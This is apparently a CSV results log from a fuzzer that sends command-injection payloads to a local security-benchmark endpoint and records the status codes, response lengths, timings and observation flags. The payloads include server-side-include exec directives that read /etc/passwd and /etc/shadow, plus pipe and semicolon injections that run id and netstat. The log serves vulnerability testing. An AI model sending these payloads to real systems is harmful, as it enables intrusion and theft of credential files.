id_fuzz,url,payload,method,resp_status_code,resp_content_length,resp_time_elapsed,type_payload,payload,observation_status_code,observation_search_file_not_found,observation_search_no_such_file,observation_search_uid,observation_search_gid,observation_search_groups,observation_search_gpermission_denied,observation_search_whoami,observation_search_root,observation_daemon,observation_error,observation_exception,observation_illegal,observation_invalid,observation_fail,observation_stack,observation_access,observation_directory,observation_not_found,observation_unknown,observation_ODBC,observation_SQL,observation_quotation_mark,observation_syntax,observation_ORA,observation_111111,observation_time_delay,observation_content_length
id_fuzz_1,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00007,&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;,POST,200,403,0:00:00.034067,cmdi,&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_1,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00007,&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;,POST,200,403,0:00:00.003101,cmdi,&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_1,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00007,&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,POST,200,403,0:00:00.002888,cmdi,&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_1,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00007,&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,POST,200,403,0:00:00.003035,cmdi,&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_1,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00007,/index.html|id|,POST,200,403,0:00:00.003680,cmdi,/index.html|id|,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_1,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00007,;id;,POST,200,403,0:00:00.003515,cmdi,;id;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_1,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00007,;id,POST,200,403,0:00:00.003813,cmdi,;id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_1,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00007,;netstat -a;,POST,200,403,0:00:00.010012,cmdi,;netstat -a;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_1,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00007,;id;,POST,200,403,0:00:00.015978,cmdi,;id;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_1,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00007,|id,POST,200,403,0:00:00.004620,cmdi,|id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_1,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00007,|/usr/bin/id,POST,200,403,0:00:00.007691,cmdi,|/usr/bin/id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_1,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00007,|id|,POST,200,403,0:00:00.015430,cmdi,|id|,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_1,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00007,|/usr/bin/id|,POST,200,403,0:00:00.026654,cmdi,|/usr/bin/id|,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_1,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00007,||/usr/bin/id|,POST,200,403,0:00:00.010160,cmdi,||/usr/bin/id|,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_1,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00007,|id;,POST,200,403,0:00:00.005249,cmdi,|id;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
